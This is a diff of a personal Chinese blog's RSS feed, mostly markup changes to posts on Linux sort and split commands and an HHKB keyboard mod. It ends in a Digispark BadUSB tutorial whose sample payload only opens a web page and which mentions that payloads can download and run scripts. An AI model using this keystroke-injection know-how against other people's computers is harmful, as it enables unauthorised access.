@@ -1,50 +1,20 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WhereIsMyMind</title><link>https://hare.one/</link><atom:link href="https://hare.one/index.xml" rel="self" type="application/rss+xml"/><description>WhereIsMyMind</description><generator>Source Themes Academic (https://sourcethemes.com/academic/)</generator><language>en</language><lastBuildDate>Fri, 08 Jan 2021 21:23:53 +0800</lastBuildDate><item><title>Linux 下的文件按照数字编号顺序排列</title><link>https://hare.one/posts/list-and-sort/</link><pubDate>Fri, 08 Jan 2021 21:23:53 +0800</pubDate><guid>https://hare.one/posts/list-and-sort/</guid><description>&lt;p>今天在终端下使用 &lt;code>ls&lt;/code> 命令的时候，发现没办法直接满足按照阿拉伯数字顺序排列的需求。&lt;/p>
 &lt;p>比如说有如下几个文件：&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plain" data-lang="plain">1_apple.txt
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plain" data-lang="plain">1_apple.txt
 12_banana.txt
 3_orange.txt
 31_mango.txt
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>这就是 &lt;code>ls&lt;/code> 命令默认的排序方式。
 而我需要的却是：&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plain" data-lang="plain">1_apple.txt
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plain" data-lang="plain">1_apple.txt
 3_orange.txt
 12_banana.txt
 31_mango.txt
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>STFW 发现可以通过管道符和 &lt;code>sort&lt;/code> 命令配合来实现。&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ls | sort -k1 -n
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ls | sort -k1 -n
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>其中，&lt;code>-k1&lt;/code> 表示按照第一个区域进行排序，&lt;code>-n&lt;/code> 表示按照数值排序。
 只用 &lt;code>ls&lt;/code> 命令的时候，&lt;code>-k&lt;/code> 参数可以省略，但如果使用 &lt;code>ls -al&lt;/code> 命令的话，需要排序的就是第九个区域，就应该是 &lt;code>-k9&lt;/code> 了。
 另外，&lt;code>-t&lt;/code> 参数可以指定用来分隔区域的字符。当数字在文件名后面作为版本号的时候，可能会用上这个参数。&lt;/p>
-&lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
-&lt;!--
-&lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
-嵌入 BiliBili 视频 --></description></item><item><title>回顾 2020</title><link>https://hare.one/posts/2020-year-end-summary/</link><pubDate>Thu, 31 Dec 2020 20:42:45 +0800</pubDate><guid>https://hare.one/posts/2020-year-end-summary/</guid><description>&lt;p>2020 年最后一天了，简单写个年终总结。&lt;/p>
-&lt;h3 id="关于记账">关于记账&lt;/h3>
-&lt;p>今年和以往相比最大的改变是开始坚持记账了，这也是我「&lt;strong>财务自由，提前退休&lt;/strong>」目标的一小步。&lt;/p>
-&lt;p>从 2020 年 1 月 1 日开始整一年。以前觉得记账太麻烦，花大钱不用记，花小钱没必要记。但是这一年坚持下来，才发现也就是几个数字，选个类别再保存一下，真没多麻烦。而且通过记账可以发现很多冲动消费，管住了很多次剁手。&lt;/p>
-&lt;p>用的记账软件是 MoneyWiz，刚开始是 MoneyWiz 2，现在换了 &lt;a href="https://apps.apple.com/app/id1511185140">MoneyWiz 2020&lt;/a>。&lt;/p>
-&lt;p>两者没什么不同，后来是因为 MoneyWiz 2 对 iOS 14 适配不是很好，保存数据后总是闪退才升级的。&lt;/p>
-&lt;p>MoneyWiz 都是很实用的功能，没有些花里胡哨的玩意儿，是款很专业的记账软件了，这点我很喜欢。其中，预算功能可以安排自己的花销；排程功能用来记录分期；报表可以用来比较支出、统计收益亏损，现在用得也算是得心应手了。&lt;/p>
-&lt;h3 id="关于博客">关于博客&lt;/h3>
-&lt;p>今年开始写博客了。说是博客，其实就是个记录自己生活、工作和想法的一个记事本。不用写作文应对考试后，「写」的能力确实是在一点点丧失的。写博客过程中的思考，可以静下心来整理一些自己的想法，也还算不错。希望这个习惯能坚持下去，毕竟我还特意买了域名呢。&lt;/p>
-&lt;h3 id="关于理财">关于理财&lt;/h3>
-&lt;p>18、19 两年，比特币和其他的一些数字货币确实让我凭运气赚了不少钱，但是后来也成功凭实力基本亏完。这笔学费让我真正明白了人只能赚自己认知范围内的钱，人的经历是有限的，与其去钻研这些不了解的领域去赚钱，不如花一点点时间，找个靠谱的基金经理，找个指数基金去定投。我是这么想的，也是这么做的。所以今年在基金市场还算是赚到了还不错的收益。坚持了三年多的定投，之前一直不愠不火，但在长期以来压低单位成本后，今年基本每周都要止盈一部分，被动收入还算可以。&lt;/p>
-&lt;h3 id="关于工作">关于工作&lt;/h3>
-&lt;p>这一年工作上没什么干劲儿，应该是在舒适区太久了吧。之后需要自己主动走出舒适区，争取更高的主动收入。增加本金，才能更快地过上自己想要的生活。&lt;/p>
-&lt;p>我太怕麻烦，不想跳槽的主要原因是我不想去认识新的同事，融入新的圈子。或许远程工作或者自由职业更适合我。&lt;/p>
-&lt;h3 id="关于家庭">关于家庭&lt;/h3>
-&lt;p>跟父亲大吵了一架。&lt;/p>
-&lt;p>无外乎就是看不惯我的生活习惯，晚睡晚起，贪玩不着家，稍有不顺意他就会发脾气。可我自己又何尝不是这样？我讨厌这样的父亲，也讨厌这样的自己。我会改变一些自己的坏脾气，但也要坚持为自己而活，不要成为父亲的所有品。&lt;/p>
-&lt;h3 id="关于感情">关于感情&lt;/h3>
-&lt;p>跟前女友若即若离，没有复合但是又维持着一定的关系。&lt;/p>
-&lt;p>现在的我有些惧怕过于亲近的关系，保持距离的情况下两人都开开心心，太亲近就会爆发摩擦。其实一个人独处也没什么不好，不是吗？&lt;/p>
-&lt;p>没有办法去包容对方的话，还是一个人慢慢沉淀比较好。&lt;/p>
-&lt;h3 id="其他的一些小事">其他的一些小事&lt;/h3>
-&lt;p>打了耳洞，做完了正畸，换了发型，改变了一些穿衣风格，导致许久未见的同学一下子没认出我来，也算是个奇妙的体验。&lt;/p>
-&lt;p>打通了几款一直想玩的游戏，看了不少躺在自己想看清单里面的电影，读了几本想看的书，折腾了些自己喜欢的小玩意儿。&lt;/p>
-&lt;p>从几平米的小屋子搬到了跟朋友合租的两居室，尝试着自己做早饭。&lt;/p>
-&lt;p>2020 年，不好不坏。&lt;/p>
-&lt;p>我，不悲不喜。&lt;/p>
 &lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
 &lt;!--
 &lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
@@ -65,17 +35,17 @@
 &lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
 嵌入 BiliBili 视频 --></description></item><item><title>Linux 下的文件分割与合并命令 Split &amp; Cat</title><link>https://hare.one/posts/split-and-cat/</link><pubDate>Tue, 13 Oct 2020 16:10:22 +0800</pubDate><guid>https://hare.one/posts/split-and-cat/</guid><description>&lt;p>最近的工作中，需要处理大型的文本文件，这在预览上很不方便，这种情况下，可以使用 Linux 下的 split 命令进行分割。&lt;/p>
 &lt;h2 id="按照文件的大小进行分割">按照文件的大小进行分割&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -b 10k input_file.txt output_file -d -a &lt;span style="color:#ae81ff">3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -b 10k input_file.txt output_file -d -a &lt;span style="color:#ae81ff">3&lt;/span>
 &lt;span style="color:#75715e"># -b 值为每一输出文件的大小&lt;/span>
 &lt;span style="color:#75715e"># -d 使用数字作为后缀&lt;/span>
 &lt;span style="color:#75715e"># -a 值为后缀长度&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>将输入的文件按照 &lt;em>10k&lt;/em> 的大小进行分割，输出的分割文件以 &lt;em>output_file&lt;/em> 开头进行命名，数字作为输出的分割文件后缀，长度为 &lt;em>3&lt;/em>&lt;/p>
 &lt;h2 id="按照文件的行数进行分割">按照文件的行数进行分割&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -l &lt;span style="color:#ae81ff">10&lt;/span> input_file.txt
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -l &lt;span style="color:#ae81ff">10&lt;/span> input_file.txt
 &lt;span style="color:#75715e"># -l 值为分割的行数&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>将输入的文件按照 &lt;em>10&lt;/em> 行每文件进行分割&lt;/p>
 &lt;h2 id="文件合并">文件合并&lt;/h2>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cat output* &amp;gt; new_file.txt
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ cat output* &amp;gt; new_file.txt
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>将以 &lt;em>output&lt;/em> 开头的文件按照顺序合并，并生成 &lt;em>new_file.txt&lt;/em> 文件&lt;/p>
 &lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
 &lt;!--
@@ -301,28 +271,28 @@
 &lt;p>&lt;span class="spoiler" > 注 1：现在已经有新款的 HHKB Hybrid Types 了，使用的 Bluetooth 4.2，同样支持蓝牙双模&lt;/span>
 &lt;br>
 &lt;span class="spoiler" >&lt;del> 注 2：有信仰的兄弟可以冲冲冲，我继续搞我的魔改&lt;/del>&lt;/span>&lt;/p>
-&lt;p>&lt;img src="\Pictures\hhkb-ble0.png" alt="hhkb-ble0" style="zoom:80%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble0.png" alt="hhkb-ble0" style="zoom:80%;" />
 &lt;center>HHKB BT&lt;/center>
 &lt;p>直到我看到了这篇 &lt;a href="https://www.chiphell.com/thread-2026980-1-1.html">HHKB 的正确使用方式&lt;/a>，我觉得找到了我需要的解决方案。&lt;/p>
 &lt;p>这个叫做 YDKB 的解决方案是由 @yangdigi 开发的主控芯片，通过替换 HHKB 原厂的主控芯片，就可以使它变成蓝牙双模 + 有线的版本。而且 YDKB 的 &lt;a href="http://help.ydkb.io/doku.php?id=start">文档&lt;/a> 写得巨详细，我喜欢。&lt;/p>
 &lt;h3 id="开搞">开搞&lt;/h3>
 &lt;p>话不多说，赶紧在淘宝上下单了改装套件，我自己选择了改装主控芯片 + 锂电池 2500mAh 的版本，不过锂电池也可以自己购置，只需要大小满足要求即可。&lt;/p>
-&lt;p>&lt;img src="\Pictures\hhkb-ble1.jpg" alt="hhkb-ble1" style="zoom:25%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble1.jpg" alt="hhkb-ble1" style="zoom:25%;" />
 &lt;center>主控芯片&lt;/center>
 &lt;p>安装过程很简单，一共只需要拧下四颗螺丝，替换原厂主控，安装锂电池就 ok 了。随 YDKB 主控模块还附带了三支可插拔的 LED，需要注意的是 LED 的光线只能透过白色版本的 HHKB，黑色的是透不过外壳的。不过这个只是作为提示用，并不是必须安装的选项，不安装的话，也会在 USB 接口的位置闪烁来提示，但没有这样直观。&lt;/p>
-&lt;p>&lt;img src="\Pictures\hhkb-ble2.jpg" alt="hhkb-ble2" style="zoom:25%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble2.jpg" alt="hhkb-ble2" style="zoom:25%;" />
 &lt;center>电池和附赠胶条&lt;/center>
 &lt;p>锂电池用附赠的双面胶条贴在键盘外壳内壁靠近的位置就可以，垫上一层泡泡纸防止键盘短接。我在这里出现了一个小插曲：电池的触点不严，导致无法供电。刚好手头也没有电烙铁，跟店家说了下就给我补发了新的电池。&lt;span class="spoiler" >&lt;del>店家说从开始卖一共就三块电池出过问题，我中奖了。&lt;/del>&lt;/span>&lt;/p>
-&lt;p>&lt;img src="\Pictures\hhkb-ble3.jpg" alt="hhkb-ble3" style="zoom:25%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble3.jpg" alt="hhkb-ble3" style="zoom:25%;" />
 &lt;center>原装主控和 HHKB BLE MOD 对比&lt;/center>
 &lt;p>YDKB 主控上有一个朝内的 USB 接口，这里可以装一个 U 盘，不过只能在连接了 USB 线的时候可以读取。我找到了一个几年前的 Kingston 8GB U 盘，也是你继续发光发热的时候了，去掉了外壳就插在了这里。对齐了 LED 就可以合上盖子拧螺丝了。到这里就替换完了。&lt;/p>
-&lt;p>&lt;img src="\Pictures\hhkb-ble4.jpg" alt="hhkb-ble4" style="zoom:25%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble4.jpg" alt="hhkb-ble4" style="zoom:25%;" />
 &lt;center>装好 LED 和内置 U 盘&lt;/center>
 &lt;p>打开开关盖子，原本有六个开关的地方只有一个开关了，打开即可。&lt;/p>
 &lt;p>原本六个开关的功能，现在可以通过刷固件进行，YDKB 支持 8 层自定义按键设置 + LEDmap 设置，烧写固件也很方便，全部都可以通过 &lt;a href="http://ydkb.io">ydkb.io&lt;/a> 搞定。&lt;/p>
 &lt;h3 id="keymap">Keymap&lt;/h3>
 &lt;p>之前说 YDKB 支持 8 层自定义按键，这 8 层其实是像下面这样叠在一起的，每次按键，从 L7 开始往下找开启的层，如果该层打开，则使用该层的键位，如果键位为 TRNS，则继续向下查找，直到找到按键或到最底层。&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">7 / ESC / F1 / F2 / F3 ....
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">7 / ESC / F1 / F2 / F3 ....
 : /-----/-----/-----/-----
 : / TAB / Q / W / E ....
 : /-----/-----/-----/-----
@@ -333,14 +303,14 @@
 0 `--------------------------
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>下面是我的 Keymap，可以用来参考。&lt;/p>
 &lt;h4 id="colemak-keyboard-layout">Colemak Keyboard Layout&lt;/h4>
-&lt;p>&lt;img src="\Pictures\hhkb-ble6.png" alt="hhkb-ble6" style="zoom:100%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble6.png" alt="hhkb-ble6" style="zoom:100%;" />
 &lt;center>Layer0&lt;/center>
 最近了解了一下键盘布局，对 Colemak 这种键盘布局很感兴趣，想要尝试切换一下布局试试。
 未能熟练使用前可能不常用，所以暂时将 Colemak 布局放在最底层，最低程度降低对其他层的影响。
 &lt;p>想要了解 Colemak 布局的话可以看这里：&lt;a href="https://colemak.com">Colemak.com&lt;/a>&lt;/p>
 &lt;p>这时候就凸显了 HHKB Pro 2 无刻版的好处，键盘自在心中。&lt;span class="spoiler" >&lt;del>所谓键上无码，心中有码&lt;/del>&lt;/span>&lt;/p>
 &lt;h4 id="qwerty-keyboard-layout">QWERTY Keyboard Layout&lt;/h4>
-&lt;p>&lt;img src="\Pictures\hhkb-ble7.png" alt="hhkb-ble7" style="zoom:100%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble7.png" alt="hhkb-ble7" style="zoom:100%;" />
 &lt;center>Layer1&lt;/center>
 这一层不必多说，就是常用的 QWERTY 布局。
 &lt;p>不一样的细节：&lt;/p>
@@ -351,7 +321,7 @@
 &lt;/ul>
 &lt;p>接下来这一层是配合&lt;strong>数字 3 键&lt;/strong>使用的：&lt;/p>
 &lt;h4 id="tricks-keys-layout">Tricks Keys Layout&lt;/h4>
-&lt;p>&lt;img src="\Pictures\hhkb-ble8.png" alt="hhkb-ble8" style="zoom:100%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble8.png" alt="hhkb-ble8" style="zoom:100%;" />
 &lt;center>Layer2&lt;/center>
 &lt;ul>
 &lt;li>
@@ -365,7 +335,7 @@
 &lt;/li>
 &lt;/ul>
 &lt;h4 id="function-keys-layout">Function Keys Layout&lt;/h4>
-&lt;p>&lt;img src="\Pictures\hhkb-ble9.png" alt="hhkb-ble9" style="zoom:100%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble9.png" alt="hhkb-ble9" style="zoom:100%;" />
 &lt;center>Layer3&lt;/center>
 &lt;p>我将原本 HHKB fn 的按键改成了瞬时切换到 Layer3，除了实现原本 fn 键的功能，还添加了一些杂七杂八的控制按键。&lt;/p>
 &lt;p>不得不感叹一下，仅仅用了四层就将 60 键的 HHKB 扩展了这么多功能，YDKB 大法好！&lt;/p>
@@ -375,20 +345,20 @@
 &lt;p>我想把 HHKB 放到 MacBook 上使用，为了避免误触，需要在 HHKB 接入 MacBook 的时候自动禁用内置键盘。&lt;/p>
 &lt;p>这里需要使用 karabiner 实现。&lt;/p>
 &lt;p>像下图这样配置 karabiner 即可实现 HHKB 蓝牙接入时禁用内置键盘的功能。&lt;/p>
-&lt;p>&lt;img src="\Pictures\karabiner.png" alt="karabiner" style="zoom:25%;" />
+&lt;img src="\Pictures\karabiner.png" alt="karabiner" style="zoom:25%;" />
 另外，可能还需要在系统配置里调整下 fn 功能键的作用，不然可能会在某些需要 fn 快捷键的情况下却调整了亮度声音。
-勾选 &lt;strong>Use F1,F2,etc. keys as standard function keys on external keyboards&amp;hellip;&lt;/strong> 选项。
-&lt;img src="\Pictures\keyboardsetting.png" alt="keyboardsetting" style="zoom:25%;" />&lt;/p>
+勾选 **Use F1,F2,etc. keys as standard function keys on external keyboards...** 选项。
+&lt;img src="\Pictures\keyboardsetting.png" alt="keyboardsetting" style="zoom:25%;" />
 &lt;p>到这里我们就可以愉快的码字敲代码了，关于电量究竟能用多久等我用光一次再说。🤣&lt;/p>
 &lt;p>最后配一张完工图。&lt;/p>
-&lt;p>&lt;img src="\Pictures\hhkb-ble5.jpg" alt="hhkb-ble5" style="zoom:25%;" />&lt;/p>
+&lt;img src="\Pictures\hhkb-ble5.jpg" alt="hhkb-ble5" style="zoom:25%;" />
 &lt;center>完工图&lt;/center>
 &lt;!--&lt;span class="spoiler" > 隐藏文字 &lt;/span>-->
 &lt;!--
 &lt;div>&lt;iframe id="biliplayer" src="//player.bilibili.com/player.html?aid=AV%e5%8f%b7&amp;page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" loading="lazy" > &lt;/iframe>&lt;/div>
 嵌入 BiliBili 视频 --></description></item><item><title>Digispark BadUSB</title><link>https://hare.one/posts/digispark-badusb/</link><pubDate>Sun, 26 Jul 2020 22:30:29 +0800</pubDate><guid>https://hare.one/posts/digispark-badusb/</guid><description>&lt;p>最近闲着无聊，本着生命在于折腾的本质，用 Digispark 做个 BadUSB 玩玩。&lt;/p>
 &lt;p>Digispark 长这样：&lt;/p>
-&lt;p>&lt;img src="https://s3.amazonaws.com/digistump-resources/images/l/2520dcf84a0a3bf2257c2559d7a187db.jpg" alt="Digispark" style="zoom:50%;" />&lt;/p>
+&lt;img src="https://s3.amazonaws.com/digistump-resources/images/l/2520dcf84a0a3bf2257c2559d7a187db.jpg" alt="Digispark" style="zoom:50%;" />
 &lt;p>简单介绍下 Digispark 这个小玩意儿：&lt;/p>
 &lt;p>Digispark USB Development Board 是一块基于 ATTiny85 微控制器的开发板，便宜小巧携带方便，某宝上十块包邮，相比于 BadUSB 的老前辈 USB Rubber Ducky 简直是便宜到家了好吗，性价比真的超高。&lt;span class="spoiler" >&lt;del>绝不承认不买 Rubber Ducky 是没钱，哼！&lt;/del>&lt;/span>&lt;/p>
 &lt;p>关于 BadUSB，网上很多人都觉得只是含有有害程序的 U 盘，并以为可以通过格式化、禁止 U 盘自启动来阻止 BadUSB 的攻击。但其实它更像是没有按键的键盘，靠着烧录进去的程序来模拟人类输入，计算机是无法识别出 BadUSB 和人类正常输入的区别的。所以大家记得一定不要随便在自己或公司的电脑上插来历不明的 U 盘！&lt;/p>
@@ -396,12 +366,12 @@
 &lt;p>要使用 Digispark 制作 BadUSB，首先要安装开发环境，在这里选择 Arduino。我的开发环境是 macOS，所以后续介绍以 macOS 为准。&lt;/p>
 &lt;p>可以在 &lt;a href="https://www.arduino.cc/">Arduino&lt;/a> 官网上选择适配自己开发环境的安装版本。&lt;/p>
 &lt;p>安装好 Arduino 后，在 &lt;strong>Preferences&lt;/strong> -&amp;gt; &lt;strong>Additional Boards Manager URLs&lt;/strong> 处输入：&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">http://digistump.com/package_digistump_index.json
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-http" data-lang="http">&lt;span style="color:#960050;background-color:#1e0010">http://digistump.com/package_digistump_index.json
 &lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>接下来在 &lt;strong>Tools&lt;/strong> -&amp;gt; &lt;strong>Board&lt;/strong> -&amp;gt; &lt;strong>Boards Manager&lt;/strong>，安装 &lt;strong>Digistump AVR Boards&lt;/strong> 包。
 等待安装好，选择 &lt;strong>Tools&lt;/strong> -&amp;gt; &lt;strong>Board&lt;/strong> -&amp;gt; &lt;strong>Digistump AVR Boards&lt;/strong> -&amp;gt; &lt;strong>Digispark(Default - 16.5 Mhz)&lt;/strong>，此时 Arduino IDE 就可以成功识别 Digispark 开发板了。&lt;span class="spoiler" >&lt;del>居然没有出现驱动方面的问题，撒花&lt;/del>&lt;/span>&lt;/p>
 &lt;h3 id="编写一份-helloworld-吧">编写一份 helloworld 吧！&lt;/h3>
 &lt;p>既然是第一次玩 Digispark 开发板，怎么能不写一份 hello world 呢：&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;DigiKeyboard.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;#34;DigiKeyboard.h&amp;#34;&lt;/span>&lt;span style="color:#75715e">
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">setup&lt;/span>() {
 &lt;span style="color:#75715e">// put your setup code here, to run once:
 &lt;/span>&lt;span style="color:#75715e">&lt;/span> DigiKeyboard.sendKeyStroke(&lt;span style="color:#ae81ff">0&lt;/span>);
@@ -420,17 +390,17 @@ DigiKeyboard.delay(&lt;span style="color:#ae81ff">300&lt;/span>);
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>}
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>点击 Verify 验证一下代码以防出错，然后就……报错了……&lt;/p>
 &lt;p>此处 Error 信息：&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">fork/exec ~/Library/Arduino15/packages/arduino/tools/avr-gcc/4.8.1-arduino5/bin/avr-g++: bad CPU type in executable
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-plaintext" data-lang="plaintext">fork/exec ~/Library/Arduino15/packages/arduino/tools/avr-gcc/4.8.1-arduino5/bin/avr-g++: bad CPU type in executable
 Error compiling for board Digispark (Default - 16.5mhz).
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>STFW 找到了原因：从 macOS Catalina 开始，不再支持 32 位程序，所以需要替换掉 Digispark 自带的 32 位 AVR 编译工具。&lt;/p>
 &lt;p>在 terminal 里运行：&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cd ~/Library/Arduino15/packages/arduino/tools/avr-gcc
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">cd ~/Library/Arduino15/packages/arduino/tools/avr-gcc
 mv 4.8.1-arduino5 orig.4.8.1
 ln -s /Applications/Arduino.app/Contents/Java/hardware/tools/avr 4.8.1-arduino5
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>再次验证，提示已经成功编译。&lt;/p>
 &lt;h3 id="烧录代码">烧录代码&lt;/h3>
 &lt;p>现在就可以上传代码到硬件上了，点击 &lt;strong>Upload&lt;/strong>，在 60 秒内插入 Digispark 开发板完成上传。&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">Running Digispark Uploader...
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">Running Digispark Uploader...
 Plug in device now... &lt;span style="color:#f92672">(&lt;/span>will timeout in &lt;span style="color:#ae81ff">60&lt;/span> seconds&lt;span style="color:#f92672">)&lt;/span>
 &amp;gt; Please plug in the device ...
 &amp;gt; Press CTRL+C to terminate the program.
@@ -461,12 +431,12 @@ running: 100% complete
 &lt;h3 id="更进一步">更进一步&lt;/h3>
 &lt;p>现在可以尝试自己写一个 payload 了。&lt;/p>
 &lt;p>其实利用 BadUSB 的攻击过程，就是将 Digispark 开发板伪装成为一个 HID（Human Interface Device）。&lt;/p>
-&lt;pre>&lt;code class="language-wiki" data-lang="wiki">HID（Human Interface Device）人机接口设备类别是 Windows 最早支持的USB类别。由其名称可以了解 HID 设备是计算机直接
+&lt;pre tabindex="0">&lt;code class="language-wiki" data-lang="wiki">HID（Human Interface Device）人机接口设备类别是 Windows 最早支持的USB类别。由其名称可以了解 HID 设备是计算机直接
 与人交互的设备，例如键盘、鼠标和游戏杆等。不过 HID 设备不一定要有人机接口，只要符合 HID 类别规范，就都是 HID 设备。
 &lt;/code>&lt;/pre>&lt;p>可以通过添加、修改注册表项，下载执行脚本，执行命令，结束进程等达到一系列我们想要实现的结果。
 现在网上给 BadUSB 准备的脚本多为给 Rubber Ducky 准备的，还好我们可以进行转换，其实原理都是一样的，只不过实现代码不同。
 Rubber Ducky 的代码长这样：&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bat" data-lang="bat">DELAY 600
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bat" data-lang="bat">DELAY 600
 &lt;span style="color:#75715e">REM Linux run dialog&lt;/span>
 ALT F2
 DELAY 200
@@ -489,7 +459,7 @@ ENTER
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>以上脚本是模拟键盘在各种操作系统上的打开指定网页的操作。&lt;/p>
 &lt;p>可以使用 &lt;a href="https://nixu-corp.github.io/">dckunio.js&lt;/a> 来在线转换，也可以使用 &lt;a href="https://github.com/mame82/duck2spark">duck2spark&lt;/a> 脚本来进行转换。&lt;/p>
 &lt;p>上面的脚本转换好了长这样：&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">/*
